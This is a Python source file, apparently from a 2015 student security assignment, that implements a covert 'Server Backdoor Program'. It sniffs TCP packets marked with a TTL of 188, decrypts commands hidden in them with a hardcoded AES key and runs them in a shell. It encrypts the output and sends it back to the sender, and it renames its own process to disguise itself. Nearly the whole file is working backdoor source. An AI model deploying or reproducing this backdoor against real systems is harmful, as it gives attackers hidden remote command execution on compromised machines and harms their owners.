'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    Server.py
--
--  PROGRAM:        Receives the command from the client, executes it and returns
--                  the output back to the client.
--
--  FUNCTIONS:      encryptData(data),
--                  decryptData(data),
--                  getCommand(packet).
--
--  DATE:           October 9, 2015
--
--  REVISIONS:      October 16, 2015
--
--  NOTES:
--  The program requires "Scapy", setproctitle, argparse, and pycrypto APIs
--  as well as root user privilege in order to work properly.
--  http://www.secdev.org/projects/scapy/
--  https://pypi.python.org/pypi/setproctitle/
--  https://docs.python.org/dev/library/argparse.html
--  https://pypi.python.org/pypi/pycrypto
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

#!/usr/bin/python
from scapy.all import *
#import logging
import subprocess
import setproctitle
import argparse
from Crypto.Cipher import AES

#Set command line arguments for the program.
cmdParser = argparse.ArgumentParser(description="Server Backdoor Program")
cmdParser.add_argument('-n',
                    '--proc',
                    dest='procName',
                    help='Process name to disguise the process under.',
                    required=True)
args = cmdParser.parse_args();

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       encryptData
--  Parameters:
--      data
--          The plaintext string - the command.
--  Return Values:
--      encryptedData
--          The ciphertext of the AES encrypted plaintext.
--  Description:
--      Function to encrypt the passed in data string using AES with the specified
--      encryption key and salt value.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def encryptData(data):
    #Both key and salt values have to be 16 bytes due to the way AES encryption works.
    key = "JustinTom 8505A3"
    salt = "A00852990-Justin"
    #Create an encryption object with the specified key and salt value in CFB mode.
    objAES = AES.new(key, AES.MODE_CFB, salt)
    #Pass in the data to encrypt and assign the return value.
    encryptedData = objAES.encrypt(data)
    return encryptedData

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       decrptData
--  Parameters:
--      data
--          The plaintext string - the command output.
--  Return Values:
--      decryptedData
--          The plaintext of the AES encrypted ciphertext.
--  Description:
--      Function to decrypt the passed in data string using AES with the specified
--      decryption key and salt value.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def decryptData(data):
    #Both key and salt values have to be 16 bytes due to the way AES encryption works.
    key = "JustinTom 8505A3"
    salt = "A00852990-Justin"
    #Create a decryption object with the specified key and salt value in CFB mode.
    objAES = AES.new(key, AES.MODE_CFB, salt)
    #Pass in the data to decrypt and assign the return value.
    decryptedData = objAES.decrypt(data)
    return decryptedData

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       getCommand
--  Parameters:
--      packet
--          The packet object that is sniffed with scapy.
--  Return Values:
--      None.
--  Description:
--      Function to parse the packet object from the scapy sniff of the network
--      traffic going to the terminal and filter it further to ensure it is the
--      packet we are looking for from the compromised server. It will then
--      decrypt the extracted command sent from the client. After executing that
--      command, pipe the output to be encrypted and sent back the client.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def getCommand(packet):
    if IP in packet[0]:
        ttl = packet[IP].ttl
        #Confirm the filter - double check that the data is coming from the expected address.
        if ttl == 188:
            destPort = packet[TCP].dport
            srcIPAddr = packet[IP].src
            dstIPAddr = packet[IP].dst
            #Decrypt the extracted command from the raw layer.
            command = decryptData(packet[Raw].load)
            #Pipe the command to a shell subprocess to receive the output
            process = subprocess.Popen(command,
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            stdout, stderr = process.communicate()
            #Concatenate the shell output to a variable prepped to send back to client.
            data = stdout + stderr
            #Encrypt the shell output.
            encryptedOutput = encryptData(data)
            #Craft a packet with the encrypted output data and send back to client.
            craftedPacket = IP(dst=srcIPAddr, ttl=188)/TCP(dport=destPort)/Raw(load=encryptedOutput)
            send(craftedPacket, verbose=0)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       packetCheck
--  Parameters:
--      packet
--          The packet object that is sniffed with scapy.
--  Return Values:
--      True
--          If the packet is the right one we're expecting.
--      False
--          If the packet is not the right one we're expecting.
--  Description:
--      Function to check if the packet we sniffed is the right one by filtering it
--      by the values we've put in our crafter packets. Returns true or false.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def packetCheck(packet):
    if IP in packet[0] and Raw in packet[2]:
        ttl = packet[IP].ttl
        srcIP = packet[IP].src
        if ttl == 188:
            return True
    else:
        return False

if __name__ == "__main__":
    #Immediately rename the process to the specified name.
    setproctitle.setproctitle(args.procName)
    #Prevent scapy from printing out anything but errors to the terminal.
    #logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    #Sniff for the TCP traffic for packets with TTL of 188 (key identifier)
    #If those conditions are true, then run the getCommand method.
    while True:
        sniff(filter="tcp", prn=getCommand, stop_filter=packetCheck)
